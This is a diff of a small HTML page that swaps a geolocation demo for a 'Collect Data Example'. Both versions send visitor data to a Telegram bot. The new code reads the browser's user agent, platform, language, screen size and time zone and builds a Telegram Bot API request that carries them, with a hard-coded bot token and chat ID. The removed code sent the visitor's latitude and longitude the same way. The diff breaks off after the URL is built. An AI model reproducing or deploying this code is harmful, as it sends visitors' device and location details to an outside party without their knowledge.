@@ -1,54 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Geolocation</title>
+    <title>Collect Data Example</title>
 </head>
 <body>
-    <h1>Geolocation Example</h1>
-    <button onclick="getLocation()">Get Location</button>
-    <p id="location"></p>
+    <h1>Data Collection Example</h1>
+    <button onclick="collectData()">Collect Data</button>
+    <p id="info"></p>
     
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
-            }
-        }
-        
-        function showPosition(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            document.getElementById("location").innerHTML = 
-            "Latitude: " + latitude + 
-            "<br>Longitude: " + longitude;
+        function collectData() {
+            // Collect various data
+            var userAgent = navigator.userAgent;
+            var platform = navigator.platform;
+            var language = navigator.language || navigator.userLanguage;
+            var screenWidth = screen.width;
+            var screenHeight = screen.height;
+            var timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // Display collected data
+            var info = "User Agent: " + userAgent + "<br>" +
+                       "Platform: " + platform + "<br>" +
+                       "Language: " + language + "<br>" +
+                       "Screen Width: " + screenWidth + "<br>" +
+                       "Screen Height: " + screenHeight + "<br>" +
+                       "Time Zone: " + timeZone;
+            document.getElementById("info").innerHTML = info;
 
-            // Send location to Telegram bot
-            sendLocationToTelegram(latitude, longitude);
-        }
-
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("location").innerHTML = "User denied the request for Geolocation.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("location").innerHTML = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("location").innerHTML = "The request to get user location timed out.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("location").innerHTML = "An unknown error occurred.";
-                    break;
-            }
+            // Send data to Telegram bot
+            sendDataToTelegram(userAgent, platform, language, screenWidth, screenHeight, timeZone);
         }
 
-        function sendLocationToTelegram(latitude, longitude) {
+        function sendDataToTelegram(userAgent, platform, language, screenWidth, screenHeight, timeZone) {
             var botToken = '7395889656:AAEM67vs5lE1xRGWyTCBCb06GOFx9VkIFUg';
             var chatId = '-1002148840772';
-            var message = `User location: Latitude: ${latitude}, Longitude: ${longitude}`;
+            var message = `User Data:\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nTime Zone: ${timeZone}`;
 
             // URL to send message to Telegram chat
             var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
